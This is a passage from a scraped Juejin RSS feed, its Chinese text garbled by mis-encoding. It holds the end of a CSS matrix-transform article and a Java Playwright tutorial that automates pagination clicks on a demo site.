<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>1</mn><mo>âˆ—</mo><mn>0</mn><mo>+</mo><mn>0.577</mn><mo>âˆ—</mo><mn>100</mn><mo>+</mo><mn>0</mn><mo>â‰ˆ</mo><mn>57.7</mn></mrow><annotation encoding="application/x-tex">x' = 1*0 + 0.577*100 + 0 â‰ˆ 57.7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0.577</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">57.7</span></span></span></span></span></p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>0</mn><mo>âˆ—</mo><mn>0</mn><mo>+</mo><mn>1</mn><mo>âˆ—</mo><mn>100</mn><mo>+</mo><mn>0</mn><mo>=</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">y' = 0*0 + 1*100 + 0 = 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">100</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">100</span></span></span></span></span></p>
<p>æ•ˆæœï¼šåŸå§‹ç‚¹ (0,100) å€¾æ–œå X è½´åç§» 57.7pxï¼ŒY è½´ä½ç½®ä¸å˜ï¼Œå‘ˆç° X è½´å‘ Y è½´å€¾æ–œçš„æ•ˆæœï¼Œå°è¯äº† c*y é¡¹çš„è·¨è½´å½±å“ã€‚</p>
<h2 data-id="heading-8">å››ã€æ ¸å¿ƒæ³¨æ„äº‹é¡¹</h2>
<ol>
<li><strong>å˜æ¢é¡ºåºå½±å“å…¬å¼ç»“æœ</strong>ï¼šçŸ©é˜µä¹˜æ³•ä¸æ»¡è¶³äº¤æ¢å¾‹ï¼Œè‹¥åŒæ—¶å­˜åœ¨ç¼©æ”¾ã€æ—‹è½¬ã€å¹³ç§»ï¼Œå‚æ•°è®¡ç®—é¡ºåºï¼ˆå¯¹åº” transform å‡½æ•°çš„å³åˆ°å·¦é¡ºåºï¼‰ä¼šæ”¹å˜ aã€bã€cã€d çš„æœ€ç»ˆå€¼ï¼Œè¿›è€Œå½±å“ x'ã€y' çš„è®¡ç®—ç»“æœã€‚</li>
<li><strong>å˜æ¢åŸç‚¹çš„é—´æ¥å½±å“</strong>ï¼š<code>transform-origin</code> æ”¹å˜çš„æ˜¯åæ ‡åŸç‚¹ä½ç½®ï¼ŒåŸå§‹åæ ‡ (x, y) ä¼šä»¥æ–°åŸç‚¹ä¸ºåŸºå‡†è®¡ç®—ï¼Œæœ€ç»ˆé€šè¿‡å…¬å¼å¾—åˆ°çš„ x'ã€y' ä¹Ÿä¼šå¯¹åº”åç§»ï¼Œä½†å…¬å¼æœ¬èº«çš„è®¡ç®—é€»è¾‘ä¸å˜ã€‚</li>
<li><strong>å‚æ•°çš„ç»„åˆæ€§</strong>ï¼šaã€bã€cã€d å››ä¸ªå‚æ•°å¹¶éç‹¬ç«‹ä½œç”¨ï¼Œæ—‹è½¬ã€ç¼©æ”¾+å€¾æ–œç­‰å¤åˆå˜æ¢ä¸­ï¼Œå®ƒä»¬ä¼šè”åŠ¨è°ƒæ•´ï¼Œæœ€ç»ˆé€šè¿‡å…¬å¼å…±åŒå†³å®šåæ ‡ä½ç½®ï¼Œè€Œ eã€f å§‹ç»ˆä½œä¸ºç‹¬ç«‹å¹³ç§»é¡¹å åŠ ã€‚</li>
</ol>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>x' = a<em>x + c</em>y + e ä¸ y' = b<em>x + d</em>y + f æ˜¯ CSS 2D çŸ©é˜µå˜æ¢çš„ã€Œåº•å±‚æ‰§è¡Œé€»è¾‘ã€ï¼Œæ ¸å¿ƒä»·å€¼æ˜¯å°†ç¼©æ”¾ã€æ—‹è½¬ã€å€¾æ–œã€å¹³ç§»å››ç§åŸºç¡€å˜æ¢ï¼Œé€šè¿‡ã€Œè‡ªèº«é¡¹+è·¨è½´é¡¹+å¹³ç§»é¡¹ã€çš„ç»„åˆï¼Œç»Ÿä¸€ä¸ºåæ ‡å±‚é¢çš„è®¡ç®—ã€‚å…¶ä¸­ï¼Œè·¨è½´é¡¹ï¼ˆc<em>yã€b</em>xï¼‰æ˜¯å®ç°æ—‹è½¬ã€å€¾æ–œçš„å…³é”®ï¼Œå¹³ç§»é¡¹ï¼ˆeã€fï¼‰æ˜¯é½æ¬¡çŸ©é˜µçš„æ ¸å¿ƒåº”ç”¨ï¼Œç†è§£è¿™ä¸¤ä¸ªå…¬å¼ï¼Œå°±èƒ½ä»æ ¹æºä¸ŠæŒæ¡ matrix çŸ©é˜µçš„çµæ´»ç”¨æ³•ï¼Œä¸å†å±€é™äºåŸºç¡€å˜æ¢å‡½æ•°ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Šåˆšåˆšé—®ä¸–ã€‹ç³»åˆ—åˆçª¥ç¯‡-Java+Playwrightè‡ªåŠ¨åŒ–æµ‹è¯•-41-ç¿»é¡µæµ‹è¯• ï¼ˆè¯¦ç»†æ•™ç¨‹ï¼‰]]></title>    <link>https://juejin.cn/post/7594350054091210794</link>    <guid>https://juejin.cn/post/7594350054091210794</guid>    <pubDate>2026-01-13T00:39:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594350054091210794" data-draft-id="7594350054091178026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Šåˆšåˆšé—®ä¸–ã€‹ç³»åˆ—åˆçª¥ç¯‡-Java+Playwrightè‡ªåŠ¨åŒ–æµ‹è¯•-41-ç¿»é¡µæµ‹è¯• ï¼ˆè¯¦ç»†æ•™ç¨‹ï¼‰"/> <meta itemprop="keywords" content="å‰ç«¯,Java,æµ‹è¯•"/> <meta itemprop="datePublished" content="2026-01-13T00:39:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åŒ—äº¬_å®å“¥"/> <meta itemprop="url" content="https://juejin.cn/user/1961184475484631"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Šåˆšåˆšé—®ä¸–ã€‹ç³»åˆ—åˆçª¥ç¯‡-Java+Playwrightè‡ªåŠ¨åŒ–æµ‹è¯•-41-ç¿»é¡µæµ‹è¯• ï¼ˆè¯¦ç»†æ•™ç¨‹ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1961184475484631/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åŒ—äº¬_å®å“¥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T00:39:54.000Z" title="Tue Jan 13 2026 00:39:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.ç®€ä»‹</h2>
<p>æ•°æ®åˆ†é¡µæ˜¯ä¸€ç§å°†å¤§é‡æ•°æ®åˆ’åˆ†æˆå¤šä¸ªé¡µé¢ä»¥æ–¹ä¾¿æŸ¥çœ‹å’Œå¤„ç†çš„åŠŸèƒ½ã€‚å½“ä¸€ä¸ªæ•°æ®è¡¨æ ¼ä¸­åŒ…å«äº†å¤§é‡æ•°æ®æ—¶ï¼Œå°†å…¶å…¨éƒ¨æ˜¾ç¤ºåœ¨åŒä¸€é¡µä¸Šä¼šä½¿é¡µé¢å˜å¾—éå¸¸æ‹¥æŒ¤å’Œéš¾ä»¥æµè§ˆã€‚å› æ­¤ï¼Œå°†æ•°æ®è¡¨æ ¼åˆ†æˆè‹¥å¹²ä¸ªå­é›†ï¼Œå¹¶å°†è¿™äº›å­é›†åˆ†åˆ«æ˜¾ç¤ºåœ¨ä¸åŒçš„é¡µé¢ä¸Šï¼Œèƒ½å¤Ÿæé«˜ç”¨æˆ·çš„æµè§ˆå’Œæ“ä½œæ•ˆç‡ã€‚ ä½†æ˜¯å¯¹äºåˆ†é¡µæµ‹è¯•ï¼Œè¿™ç§ä¸€èˆ¬éƒ½æ˜¯å…¬å…±çš„æ–¹æ³•ç³»ç»Ÿä¸­éƒ½å†™å¥½äº†ï¼Œè¿™ç§ä¸€èˆ¬å‡ºç°æ˜¯æ•°æ®å±•ç¤ºæ¯”è¾ƒå¤šçš„æ—¶å€™ï¼Œä¼šé‡‡å–åˆ†é¡µçš„æ–¹æ³•ï¼Œè€Œä¸”æ¯”è¾ƒå›ºå®šï¼Œä¸€èˆ¬æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œå› æ­¤å®ƒéå¸¸é€‚åˆè‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä½†æ˜¯å¦‚ä½•ä½¿ç”¨playwrightæ¥è¿›è¡Œç¿»é¡µè‡ªåŠ¨åŒ–æµ‹è¯•äº†ï¼Œå®å“¥ä»Šå¤©å°±è®²è§£å’Œåˆ†äº«ä¸€ä¸‹ã€‚</p>
<h2 data-id="heading-1">2.æµ‹è¯•åœºæ™¯</h2>
<p>å¯¹åˆ†é¡µæ¥è¯´ï¼Œæˆ‘ä»¬æœ€æ„Ÿå…´è¶£çš„å’Œæµ‹è¯•çš„æ— éå°±æ˜¯ä¸‹é¢å‡ ä¸ªä¿¡æ¯ï¼š<br/>
ï¼ˆ1ï¼‰å½“å‰æ€»å…±æœ‰å¤šå°‘é¡µï¼ˆå› ä¸ºæœ‰æ—¶å€™å½“å‰æ˜¯6é¡µä½†æ˜¯ç‚¹å‡»ä¸‹ä¸€ä¸ªå‰è¾¹çš„æ¶ˆå¤±åè¾¹çš„é¡µç å°±ä¼šå‡ºç°äº†ï¼Œæ€»æ•°å¤§äºå½“å‰é¡µæ•°ï¼‰<br/>
ï¼ˆ2ï¼‰å½“å‰æ˜¯ç¬¬å‡ é¡µ<br/>
ï¼ˆ3ï¼‰æ˜¯å¦å¯ä»¥ä¸Šä¸€é¡µå’Œä¸‹ä¸€é¡µç‚¹å‡»</p>
<h2 data-id="heading-2">3.è‡ªåŠ¨åŒ–å®æˆ˜</h2>
<p>å®å“¥å‘ç°äº†ä¸€ä¸ªæœ‰ç”¨çš„å°ç½‘ç«™ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ‰¾åˆ°å„ç§å„æ ·çš„å®ä¾‹ï¼Œå®å“¥å°±å†ä¹Ÿä¸ç”¨è‡ªå·±å†™demoäº†ï¼Œç½‘ç«™åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.jq22.com%2F" target="_blank" title="https://www.jq22.com/" ref="nofollow noopener noreferrer">www.jq22.com</a></p>
<h3 data-id="heading-3">3.1ä»£ç è®¾è®¡</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/84c7815d3a804f78b36fddf3b2d4e119~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX5LqsX-Wuj-WTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768869594&amp;x-signature=SkrBzXEu7aS397IQTs7DgKF1uH0%3D" alt="image" loading="lazy"/></p>
<h3 data-id="heading-4">3.2å‚è€ƒä»£ç </h3>
<pre><code class="hljs language-ini" lang="ini">package com.bjhg.playwright<span class="hljs-comment">;</span>

import com.microsoft.playwright.Browser<span class="hljs-comment">;</span>
import com.microsoft.playwright.BrowserContext<span class="hljs-comment">;</span>
import com.microsoft.playwright.BrowserType<span class="hljs-comment">;</span>
import com.microsoft.playwright.Locator<span class="hljs-comment">;</span>
import com.microsoft.playwright.Page<span class="hljs-comment">;</span>
import com.microsoft.playwright.Playwright<span class="hljs-comment">;</span>

/**
 * @author åŒ—äº¬-å®å“¥
 * 
 * @å…¬ä¼—å·:åŒ—äº¬å®å“¥ï¼ˆå¾®ä¿¡æœç´¢ï¼Œå…³æ³¨å®å“¥ï¼Œæå‰è§£é”æ›´å¤šæµ‹è¯•å¹²è´§ï¼‰
 * 
 * ã€Šåˆšåˆšé—®ä¸–ã€‹ç³»åˆ—åˆçª¥ç¯‡-Java+Playwrightè‡ªåŠ¨åŒ–æµ‹è¯•-41-ç¿»é¡µæµ‹è¯• ï¼ˆè¯¦ç»†æ•™ç¨‹ï¼‰ 
 *
 * 2025å¹´12æœˆ31æ—¥
 */

public class Test_Page {
    
    public static void main(String<span class="hljs-section">[]</span> args) {
        // TODO Auto-generated method stub
        try (Playwright <span class="hljs-attr">playwright</span> = Playwright.create()) {
            //1.ä½¿ç”¨chromiumæµè§ˆå™¨ï¼Œ<span class="hljs-comment"># æµè§ˆå™¨é…ç½®ï¼Œè®¾ç½®ä»¥GUIæ¨¡å¼å¯åŠ¨Chromeæµè§ˆå™¨ï¼ˆè¦æŸ¥çœ‹æµè§ˆå™¨UIï¼Œåœ¨å¯åŠ¨æµè§ˆå™¨æ—¶ä¼ é€’ headless=false æ ‡å¿—ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ slowMo æ¥å‡æ…¢æ‰§è¡Œé€Ÿåº¦ã€‚</span>
            Browser <span class="hljs-attr">browser</span> = playwright.chromium().launch(new BrowserType.LaunchOptions().setHeadless(<span class="hljs-literal">false</span>).setSlowMo(<span class="hljs-number">300</span>))<span class="hljs-comment">;</span>
            //2.åˆ›å»ºcontext
            BrowserContext <span class="hljs-attr">context</span> = browser.newContext()<span class="hljs-comment">;</span>
            //åˆ›å»ºpage
            Page <span class="hljs-attr">page</span> = context.newPage()<span class="hljs-comment">;</span>
            page.screenshot()<span class="hljs-comment">;</span>
            //3.æµè§ˆå™¨è®¿é—®demo
            page.navigate("https://www.jq22.com/demojq22ys/jquerypager20150821/")<span class="hljs-comment">;</span>
            Thread.sleep(300)<span class="hljs-comment">;</span>
            // è®¡ç®—å±•ç¤ºå‡ºæ€»é¡µæ•°ï¼šè·å–æ‰€æœ‰liå…ƒç´ æ•°é‡ï¼Œå¹¶å‡å»é¦–å°¾å¯¼èˆªæŒ‰é’®ï¼ˆé¦–é¡µã€Â«ã€Â»ã€å°¾é¡µï¼‰
            int <span class="hljs-attr">totalLiCount</span> = page.locator(<span class="hljs-string">"//*[@id='pager']/ul/li"</span>).count()<span class="hljs-comment">;</span>
            int <span class="hljs-attr">totalPages</span> = totalLiCount - <span class="hljs-number">4</span><span class="hljs-comment">; // å‡å»é¦–é¡µã€ä¸Šä¸€ä¸ªã€ä¸‹ä¸€ä¸ªã€å°¾é¡µ(å¦‚æœå­˜åœ¨)æˆ–å ä½ç¬¦</span>
            System.out.println("Current Total page is: " + totalPages)<span class="hljs-comment">;</span>

            // éå†æ‰€æœ‰åˆ†é¡µå…ƒç´ 
            Locator <span class="hljs-attr">allPageItems</span> = page.locator(<span class="hljs-string">"//*[@id='pager']/ul/li"</span>)<span class="hljs-comment">;</span>
            for (int <span class="hljs-attr">i</span> = <span class="hljs-number">4</span><span class="hljs-comment">; i &lt; allPageItems.count(); i++) {</span>
                // ç‚¹å‡»ç¬¬iä¸ªåˆ†é¡µæŒ‰é’®ï¼ˆç´¢å¼•ä»1å¼€å§‹ï¼Œä½†æ˜¯ç½‘é¡µçš„é¦–é¡µã€ä¸Šä¸€é¡µæ²¡æœ‰æ˜¾ç¤ºå’Œç¬¬ä¸€é¡µå·²ç»ç‚¹å‡»æ‰€ä»¥ä»ç¬¬äºŒé¡µå¼€å§‹ç‚¹å‡»ï¼‰
                page.locator("//div<span class="hljs-section">[@id='pager']</span>/ul/li<span class="hljs-section">["+i+"]</span>").click()<span class="hljs-comment">;</span>
                // ç­‰å¾…300æ¯«ç§’ï¼Œæ¨¡æ‹Ÿæ“ä½œé—´éš”
                page.waitForTimeout(300)<span class="hljs-comment">;</span>
            }

            // å®šä½å¹¶è·å–å½“å‰æ¿€æ´»é¡µé¢çš„é¡µç æ–‡æœ¬
            Locator <span class="hljs-attr">currentPageLocator</span> = page.locator(<span class="hljs-string">"#pager &gt;&gt; ul &gt;&gt; li.pgCurrent"</span>)<span class="hljs-comment">;</span>
            String <span class="hljs-attr">currentPageText</span> = currentPageLocator.textContent()<span class="hljs-comment">;</span>
            System.out.println("Current click page is: " + currentPageText)<span class="hljs-comment">;</span>
            Thread.sleep(1000)<span class="hljs-comment">;</span>
            System.out.println("Test Pass")<span class="hljs-comment">;</span>
            //5.å…³é—­page
            page.close()<span class="hljs-comment">;</span>
            //6.å…³é—­browser
            browser.close()<span class="hljs-comment">;</span>
        } catch (InterruptedException e) {
            // TODO Auto-generated catch block
            e.printStackTrace()<span class="hljs-comment">;</span>
        }

    }

}
</code></pre>
<h3 data-id="heading-5">3.3è¿è¡Œä»£ç </h3>
<p>1.è¿è¡Œä»£ç ï¼Œå³é”®Run As-&gt;Java Applicationï¼Œå°±å¯ä»¥çœ‹åˆ°æ§åˆ¶å°è¾“å‡ºï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/070fb35b5e2a4f198b700ca207e2bbce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX5LqsX-Wuj-WTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768869594&amp;x-signature=zmxDLRlDcncsllhfXeKCsp8oEh0%3D" alt="image" loading="lazy"/></p>
<p>2.è¿è¡Œä»£ç åç”µè„‘ç«¯çš„æµè§ˆå™¨çš„åŠ¨ä½œï¼ˆè®¿é—®demoï¼Œç‚¹å‡»ç¬¬äºŒé¡µï¼Œç„¶åæ‰“å°å½“å‰ç‚¹å‡»é€‰ä¸­çš„é¡µç ï¼‰ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9fd400992564435aaa4c5481fb49a46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YyX5LqsX-Wuj-WTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768869594&amp;x-signature=xvXoeW%2B5pc2o6iFUi9%2B8g7tsNh0%3D" alt="GIF+2025-12-31+8-34-58" loading="lazy"/></p>
<h2 data-id="heading-6">4.å°ç»“</h2>
<p>åˆ°æ­¤ç¿»é¡µè‡ªåŠ¨åŒ–æµ‹è¯•å°±å®ç°äº†ï¼Œå…¶å®å¾ˆç®€å•çš„ï¼Œéš¾ç‚¹å°±æ˜¯å®šä½å…ƒç´ ï¼Œä»¥åŠå¾ªç¯ç‚¹å‡»é¡µç ã€‚å¥½äº†ï¼Œä»Šå¤©æ—¶é—´ä¸æ˜¯å¾ˆæ—©äº†ï¼Œå®å“¥å°±è®²è§£å’Œåˆ†äº«åˆ°è¿™é‡Œï¼Œæ„Ÿè°¢æ‚¨è€å¿ƒçš„é˜…è¯»ï¼ï¼ï¼ä»Šå¤©æ˜¯2025å¹´çš„æœ€åä¸€å¤©äº†ï¼ŒåŸä¼°è®¡æ²¡æœ‰æ‰“ç®—å‘æ–‡ï¼Œæƒ³ç€æœ‰å§‹æœ‰ç»ˆï¼Œè¿˜æ˜¯æ°´ä¸€ç¯‡å§ï¼ˆæ¯”è¾ƒç®€å•ï¼Œæœ›å„ä½è§è°…ï¼‰ï¼Œæå‰ç¥å„ä½å°ä¼™ä¼´æˆ–è€…ç«¥é‹ä»¬ï¼Œæ–°å¹´å¤§å‰ï¼Œç¦è¿åŠ ç ï¼Œé©¬ä¸Šå‘è´¢~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸš€ å¼€æºä¸€æ¬¾åŸºäº PaddleOCR çš„çº¯ç¦»çº¿ OCR è¯†åˆ«æ’ä»¶ | æ”¯æŒèº«ä»½è¯ã€é“¶è¡Œå¡ã€é©¾é©¶è¯è¯†åˆ«]]></title>    <link>https://juejin.cn/post/7594315259462631459</link>    <guid>https://juejin.cn/post/7594315259462631459</guid>    <pubDate>2026-01-13T01:30:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" 